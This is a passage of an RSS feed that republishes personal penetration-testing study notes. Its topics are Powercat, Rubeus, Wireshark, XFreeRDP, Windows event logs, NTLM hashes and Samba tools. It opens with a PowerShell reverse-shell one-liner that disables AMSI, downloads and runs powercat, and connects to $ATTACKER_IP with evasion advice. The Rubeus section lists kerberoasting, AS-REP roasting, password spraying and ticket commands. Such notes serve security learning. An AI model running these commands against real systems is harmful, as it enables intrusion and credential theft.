class=&quot;kw&quot;&gt;forEach&lt;/span&gt;{&lt;span class=&quot;va&quot;&gt;$result2&lt;/span&gt;=&lt;span class=&quot;va&quot;&gt;$result2&lt;/span&gt;+&lt;span class=&quot;va&quot;&gt;$_&lt;/span&gt;};&lt;span class=&quot;va&quot;&gt;$result2&lt;/span&gt;),&amp;#39;NonPublic,Static&amp;#39;).&lt;span class=&quot;fu&quot;&gt;SetValue&lt;/span&gt;(&lt;span class=&quot;va&quot;&gt;$null&lt;/span&gt;,&lt;span class=&quot;va&quot;&gt;$true&lt;/span&gt;); &lt;span class=&quot;fu&quot;&gt;IEX&lt;/span&gt; (&lt;span class=&quot;fu&quot;&gt;New-Object&lt;/span&gt; System.&lt;span class=&quot;fu&quot;&gt;Net&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;Webclient&lt;/span&gt;).&lt;span class=&quot;fu&quot;&gt;DownloadString&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&amp;quot;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&amp;quot;&lt;/span&gt;); powercat -c &lt;span class=&quot;va&quot;&gt;$ATTACKER_IP&lt;/span&gt; -p &lt;span class=&quot;va&quot;&gt;$ATTACKER_PORT&lt;/span&gt; -e cmd.&lt;span class=&quot;fu&quot;&gt;exe&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It's probably advisable to use your own server to host Powercat in order to make tripping network alarms less likely.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.offensive-security.com/offsec/offsec-live/&quot;&gt;OffSec Live&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20Powercat.md</guid>
		</item>
		<item>
			<title>Using Rubeus</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20Rubeus.md</link>
			<description>&lt;p&gt;Rubeus is a Windows-only post-exploitation tool for attacking Kerberos. No compiled binaries are available (either through the GitHub repo or Kali Linux's &lt;code&gt;windows-binaries&lt;/code&gt; package).&lt;/p&gt;&lt;p&gt;NOTE: To use Rebueus you need to already be on the domain you are attacking, or alternately need to have mapped the domain controller (which normally hosts the KDC) IP address properly in C:/Windows/System32/drivers/etc/hosts.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/GhostPack/Rubeus&quot;&gt;Rubeus&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Kerberos.md&quot;&gt;Kerberos&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;harvest-kerberos-tickets&quot;&gt;Harvest Kerberos Tickets&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Harvest ticket granting tickets observed by the current machine.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Probably works best when run on a domain controller.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;Rubeus.&lt;span class=&quot;fu&quot;&gt;exe&lt;/span&gt; harvest /interval:30&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;password-spraying&quot;&gt;Password Spraying&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Spray the specified password across all known users and generate a&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# ticket giving ticket for successful authentications. (Can trigger&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-3&quot;&gt;&lt;a href=&quot;#cb2-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# account lockouts!)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-4&quot;&gt;&lt;a href=&quot;#cb2-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-5&quot;&gt;&lt;a href=&quot;#cb2-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;Rubeus.&lt;span class=&quot;fu&quot;&gt;exe&lt;/span&gt; brute /password:ThePasswordToSpray /noticket&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;kerberoasting&quot;&gt;Kerberoasting&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Extract password hashes for all known kerberoastable accounts using&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Rubeus.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-3&quot;&gt;&lt;a href=&quot;#cb3-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-4&quot;&gt;&lt;a href=&quot;#cb3-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;Rubeus.&lt;span class=&quot;fu&quot;&gt;exe&lt;/span&gt; kerberoast&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The password hashes output here can then be cracked with Hashcat (use the 13100 hash mode).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20Hashcat.md&quot;&gt;Using Hashcat&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;as-rep-roasting&quot;&gt;AS-REP Roasting&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb4-1&quot;&gt;&lt;a href=&quot;#cb4-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# AS-REP roasting with Rubeus.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-2&quot;&gt;&lt;a href=&quot;#cb4-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-3&quot;&gt;&lt;a href=&quot;#cb4-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;Rubeus.&lt;span class=&quot;fu&quot;&gt;exe&lt;/span&gt; asreproast&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To use Hashcat to crack the hashes obtained in this fashin, first insert &lt;code&gt;23$&lt;/code&gt; after the leading &lt;code&gt;$kerb5asrep$&lt;/code&gt; (so &lt;code&gt;$kerb5asrep$&lt;/code&gt; â &lt;code&gt;$kerb5asrep$23$&lt;/code&gt;) and then use mode 18200.&lt;/p&gt;&lt;h2 id=&quot;using-a-certificate-to-request-a-ticket&quot;&gt;Using a Certificate to Request a Ticket&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb5&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb5-1&quot;&gt;&lt;a href=&quot;#cb5-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Request a ticket using a certificate from AD CS.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-2&quot;&gt;&lt;a href=&quot;#cb5-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-3&quot;&gt;&lt;a href=&quot;#cb5-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;Rubeus.&lt;span class=&quot;fu&quot;&gt;exe&lt;/span&gt; asktgt /user:&lt;span class=&quot;va&quot;&gt;$USER&lt;/span&gt; `&lt;/span&gt;
&lt;span id=&quot;cb5-4&quot;&gt;&lt;a href=&quot;#cb5-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                  /enctype:aes256 `&lt;/span&gt;
&lt;span id=&quot;cb5-5&quot;&gt;&lt;a href=&quot;#cb5-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                  /certificate:&lt;span class=&quot;va&quot;&gt;$CERTIFICATE_FILE&lt;/span&gt; `&lt;/span&gt;
&lt;span id=&quot;cb5-6&quot;&gt;&lt;a href=&quot;#cb5-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                  /password:&lt;span class=&quot;va&quot;&gt;$CERTIFICATE_FILE_PASSWORD&lt;/span&gt; `&lt;/span&gt;
&lt;span id=&quot;cb5-7&quot;&gt;&lt;a href=&quot;#cb5-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                  /outfile:&lt;span class=&quot;va&quot;&gt;$TICKET_FILE&lt;/span&gt; `&lt;/span&gt;
&lt;span id=&quot;cb5-8&quot;&gt;&lt;a href=&quot;#cb5-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                  /domain:&lt;span class=&quot;va&quot;&gt;$DOMAIN&lt;/span&gt; `&lt;/span&gt;
&lt;span id=&quot;cb5-9&quot;&gt;&lt;a href=&quot;#cb5-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                  /dc:&lt;span class=&quot;va&quot;&gt;$DC_IP_ADDRESS&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This is very useful if we've used an AD CS misconfiguration as described by SpectreOps' &quot;Certified Pre-Owned&quot; research to forge a certificate that's valid for another user.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://posts.specterops.io/certified-pre-owned-d95910965cd2&quot;&gt;SpectreOps: Certified Pre-Owned&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;change-a-users-password&quot;&gt;Change a User's Password&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb6&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb6-1&quot;&gt;&lt;a href=&quot;#cb6-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# We can use Rubeus to change the password for domain users so long as&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-2&quot;&gt;&lt;a href=&quot;#cb6-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# our ticket is for a user with permission to do so (generally the user&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-3&quot;&gt;&lt;a href=&quot;#cb6-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# themselves or a domain admin.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-4&quot;&gt;&lt;a href=&quot;#cb6-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-5&quot;&gt;&lt;a href=&quot;#cb6-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;Rubeus.&lt;span class=&quot;fu&quot;&gt;exe&lt;/span&gt; changepw /ticket:&lt;span class=&quot;va&quot;&gt;$TICKET_FILE&lt;/span&gt; `&lt;/span&gt;
&lt;span id=&quot;cb6-6&quot;&gt;&lt;a href=&quot;#cb6-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                    /new:&lt;span class=&quot;va&quot;&gt;$NEW_PASSWORD&lt;/span&gt; `&lt;/span&gt;
&lt;span id=&quot;cb6-7&quot;&gt;&lt;a href=&quot;#cb6-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                    /dc:&lt;span class=&quot;va&quot;&gt;$DC_IP_ADDRESS&lt;/span&gt; `&lt;/span&gt;
&lt;span id=&quot;cb6-8&quot;&gt;&lt;a href=&quot;#cb6-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                    /targetuser:&lt;span class=&quot;va&quot;&gt;$DOMAIN&lt;/span&gt;\&lt;span class=&quot;va&quot;&gt;$USER&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20Rubeus.md</guid>
		</item>
		<item>
			<title>Using Wireshark</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20Wireshark.md</link>
			<description>&lt;h2 id=&quot;user-interface&quot;&gt;User Interface&lt;/h2&gt;&lt;p&gt;TCP &quot;conversations&quot; (related packets) can be automatically filtered by right-clicking on a packet and selecting &quot;Conversation Filter &amp;gt; TCP&quot; (this matches all packets with the same source/destination IP/port). This really just automatically applies a filter.&lt;/p&gt;&lt;p&gt;Use &quot;Statistics &amp;gt; Conversations&quot; to get a quick overview of the conversations in a packet capture. You can limit conversation statistics to the current filter view using the &quot;Limit to display filter&quot; checkbox.&lt;/p&gt;&lt;p&gt;Use &quot;Statistics &amp;gt; Capture File Properties&quot; to see information about capture files (you can also include/save comments here!).&lt;/p&gt;&lt;h3 id=&quot;packet-list&quot;&gt;Packet List&lt;/h3&gt;&lt;p&gt;By default, the &quot;Time&quot; column is in seconds and starts at zero (0) for the first packet captured. PCAP files actually include the full packet timestamp, so the format of the &quot;Time&quot; column can be changed using &quot;View &amp;gt; Time Display Format&quot;.&lt;/p&gt;&lt;p&gt;Wireshark adds some additional packet information, designated as &lt;code&gt;[Wireshark Data]&lt;/code&gt;. Some examples:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Stream Index - The index of the streams/conversations displayed in the current filter, starting from 0.&lt;/li&gt;&lt;li&gt;TCP Segment Length - The packet data length (this is useful for figuring out weird things, like SYN packets with data).&lt;/li&gt;&lt;li&gt;Conversation Completeness - A measure of how much of the current conversation/stream is present in the packet capture (for TCP conversations, Wireshark expects a handshake, some data, and then a FIN or RST).&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Wireshark will also use these fields to note unusual TCP packet behaviors (such as the lack of an MSS option).&lt;/p&gt;&lt;p&gt;When you select an ACK packet in Wireshark, a checkmark will be displayed next to the packet that is being acknowledged.&lt;/p&gt;&lt;p&gt;If you can find an encryption key in a packet dump, you can try applying them to encrypted packets in Wireshark using &quot;Preferences &amp;gt; RSA Keys&quot;.&lt;/p&gt;&lt;p&gt;Wireshark can easily extract files from HTTP conversations. To extract them from raw TCP streams, (1) locate the beginning of the stream, (2) right-click on the packet and select &quot;Follow &amp;gt; TCP Stream, (3) change &quot;Show data as&quot; to &quot;Raw&quot;, and (4) save it off using &quot;Save As&quot;.&lt;/p&gt;&lt;h2 id=&quot;filtering&quot;&gt;Filtering&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;Filter on a negation using &lt;code&gt;!&lt;/code&gt; (for example, &lt;code&gt;!arp&lt;/code&gt; filters out ARP packets).&lt;/li&gt;&lt;li&gt;To see SYN/ACK packets, filter with &lt;code&gt;tcp.flags.syn == 1 &amp;amp;&amp;amp; tcp.flags.ack == 1&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;To search within packets use the filter &lt;code&gt;frame contains &quot;$TEXT_TO_SEARCH&quot;&lt;/code&gt;.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;If you click on a field for a packet, the filter name is displayed in the lower left. (For example, TCP SYN packets are tcp.flags.syn.) You can automatically apply a filter (or &quot;prepare&quot; a filter, which lets you see the filter before it's applied) by right-clicking on it and choosing &quot;Apply as Filter&quot; (or &quot;Prepare as Filter&quot;).&lt;/p&gt;&lt;p&gt;To see (suspected) retransmissions in Wireshark, filter for the &lt;code&gt;tcp.analysis.retransmission&lt;/code&gt; flag. Some retransmissions may be &quot;fast&quot;, in that the packet is transmitted before the TCP timer would have expired. This happens when SACK is used, typically after a packet isn't acknowledged in after three consecutive SACK blocks.&lt;/p&gt;&lt;h2 id=&quot;customization&quot;&gt;Customization&lt;/h2&gt;&lt;p&gt;Wireshark supports &quot;profiles&quot; (accessible in the lower right in the status bar) that are just collections of settings, filters, layouts, etc.&lt;/p&gt;&lt;p&gt;Wireshark allows filters to be saved for quick access; use the &quot;+&quot; button to the right of the filter bar. Drop-down menus can be created by separating menu components with &lt;code&gt;//&lt;/code&gt; (for example, &lt;code&gt;Menu//Submenu//Filter Name&lt;/code&gt;).&lt;/p&gt;&lt;p&gt;Protocol names can be resolved in the Wireshark preferences by checking the &quot;Name Resolution &amp;gt; Resolve transport names&quot; option. IP address resolution is controlled using &quot;Name Resolution &amp;gt; Resolve network (IP) addresses&quot;. Wireshark can pull from either DNS querier in the packet capture itself, or from the resolver itself. Using an external resolver can get pretty noisy though.&lt;/p&gt;&lt;h3 id=&quot;color-rules&quot;&gt;Color Rules&lt;/h3&gt;&lt;p&gt;Color rules are just filters; they're matched in order (from top down), with the first matched coloring rule applying. Note that Wireshark is not really consistent about applying new coloring rules - it's best to reload the file after creating/modifying rules.&lt;/p&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20Wireshark.md</guid>
		</item>
		<item>
			<title>Using XFreeRDP</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20XFreeRDP.md</link>
			<description>&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;xfreerdp&lt;/span&gt; /dynamic-resolution &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;         &lt;span class=&quot;ex&quot;&gt;+clipboard&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;         /cert:&lt;span class=&quot;ex&quot;&gt;ignore&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;         /v:&lt;span class=&quot;va&quot;&gt;$TARGET_IP&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;         /u:&lt;span class=&quot;va&quot;&gt;$USER&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;         /p:&lt;span class=&quot;va&quot;&gt;$PASSWORD&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/beginner&quot;&gt;TryHackMe: Complete Beginner&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20XFreeRDP.md</guid>
		</item>
		<item>
			<title>Windows Event Logs</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Windows%20Event%20Logs.md</link>
			<description>&lt;h2 id=&quot;windows-logs&quot;&gt;Windows Logs&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;Application - Contains events logged by applications. For example, a database application might record a file error. The application developer decides which events to record.&lt;/li&gt;&lt;li&gt;Security - Contains events such as valid and invalid logon attempts, as well as events related to resource use such as creating, opening, or deleting files or other objects. An administrator can start auditing to record events in the security log.&lt;/li&gt;&lt;li&gt;System - Contains events logged by system components, such as the failure of a driver or other system component to load during startup.&lt;/li&gt;&lt;li&gt;[CustomLog] - Contains events logged by applications that create a custom log. Using a custom log enables an application to control the size of the log or attach ACLs for security purposes without affecting other applications.&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;log-fields&quot;&gt;Log Fields&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;Type - Warning, error, information, etc.&lt;/li&gt;&lt;li&gt;Time - Date/time for the computer &lt;em&gt;sending&lt;/em&gt; the log&lt;/li&gt;&lt;li&gt;Computer - Computer name&lt;/li&gt;&lt;li&gt;Provider Type - The facility that generated the event (generally the Windows Event Log)&lt;/li&gt;&lt;li&gt;Provider Name - The name of the log (Application, Security, etc.)&lt;/li&gt;&lt;li&gt;Source - Application&lt;/li&gt;&lt;li&gt;Event ID - Standardized (&lt;em&gt;not&lt;/em&gt; unique!) identifier&lt;/li&gt;&lt;li&gt;Description - Self-explanatory&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Microsoft has more detailed documentation.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/eventlog/eventlog-key&quot;&gt;Eventlog Key&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;event-types&quot;&gt;Event Types&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;Error - An event that indicates a significant problem such as loss of data or loss of functionality. For example, if a service fails to load during startup, an Error event is logged.&lt;/li&gt;&lt;li&gt;Warning - An event that is not necessarily significant, but may indicate a possible future problem. For example, when disk space is low, a Warning event is logged. If an application can recover from an event without loss of functionality or data, it can generally classify the event as a Warning event.&lt;/li&gt;&lt;li&gt;Information - An event that describes the successful operation of an application, driver, or service. For example, when a network driver loads successfully, it may be appropriate to log an Information event. Note that it is generally inappropriate for a desktop application to log an event each time it starts.&lt;/li&gt;&lt;li&gt;Success Audit - An event that records an audited security access attempt that is successful. For example, a user's successful attempt to log on to the system is logged as a Success Audit event.&lt;/li&gt;&lt;li&gt;Failure Audit - An event that records an audited security access attempt that fails. For example, if a user tries to access a network drive and fails, the attempt is logged as a Failure Audit event.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Microsoft has more detailed documentation.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/eventlog/event-types&quot;&gt;Event Types&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;event-ids&quot;&gt;Event IDs&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;104 - Event log was cleared&lt;/li&gt;&lt;li&gt;1102 - Audit log was cleared (517 on Windows 2003 and earlier)&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;It's hard to find documentation about event ID, and the meaning seems to shift between versions of Windows.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://serverfault.com/questions/743575/how-to-find-out-who-deleted-event-viewer-logs&quot;&gt;How to find out who deleted Event Viewer logs&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://support.alertlogic.com/hc/articles/115004121423-Windows-Security-Event-Log-Cleared&quot;&gt;Windows Security Event Log Cleared&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Windows%20Event%20Logs.md</guid>
		</item>
		<item>
			<title>Windows Password Hashes</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Windows%20Password%20Hashes.md</link>
			<description>&lt;p&gt;The Windows NT family uses NTLM for (network) logins, and stores hashes in the NT hash format, which is really just the md4 hash of the UTF-16-LE encoding of the user password (UTF-16-LE is the little endian version of UTF-16). While NTLM is the login protocol, people commonly call NT hashes &quot;NTLM&quot; hashes.&lt;/p&gt;&lt;p&gt;The &quot;LM&quot; in &quot;NTLM&quot; references the pre-NT password hashing mechanism, LM. LM hashes are constructed in an absolutely batshit crazy fashion, and are &lt;em&gt;much&lt;/em&gt; weaker than (the already weak) NT hashes.&lt;/p&gt;&lt;p&gt;Windows passwords are stored in the SAM, but NT and LM hashes (which can coexist on the same system) are stored in different data structures.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/beginner&quot;&gt;TryHackMe: Complete Beginner&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4&quot;&gt;LM, NTLM, Net-NTLMv2, oh my!&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Windows%20Password%20Hashes.md</guid>
		</item>
		<item>
			<title>Working With Samba</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Working%20With%20Samba.md</link>
			<description>&lt;h2 id=&quot;smbmap&quot;&gt;smbmap&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;-h&lt;/code&gt; - IP address or host to enumerate&lt;/li&gt;&lt;li&gt;&lt;code&gt;-u&lt;/code&gt; - username to use during enumeration (attempts to use the NULL session if not supplied)&lt;/li&gt;&lt;li&gt;&lt;code&gt;-p&lt;/code&gt; - password or NTLM hash to use during enumeration&lt;/li&gt;&lt;li&gt;&lt;code&gt;-d&lt;/code&gt; - domain (or workgroup) to use during enumeration&lt;/li&gt;&lt;li&gt;&lt;code&gt;-s&lt;/code&gt; - share to enumerate (defaults to &lt;code&gt;C$&lt;/code&gt; if not supplied)&lt;/li&gt;&lt;li&gt;&lt;code&gt;-x&lt;/code&gt; - attempt to execute the supplied command (!!!) on the server (if the user you're connecting as has permission to do so)&lt;/li&gt;&lt;li&gt;&lt;code&gt;--download&lt;/code&gt;/&lt;code&gt;--upload&lt;/code&gt; - download or upload a file to specified share&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;smbclient&quot;&gt;smbclient&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;smbclient&lt;/span&gt; //&lt;span class=&quot;va&quot;&gt;$IP&lt;/span&gt;/&lt;span class=&quot;va&quot;&gt;$SHARE&lt;/span&gt; -U &lt;span class=&quot;va&quot;&gt;$USER&lt;/span&gt; -p &lt;span 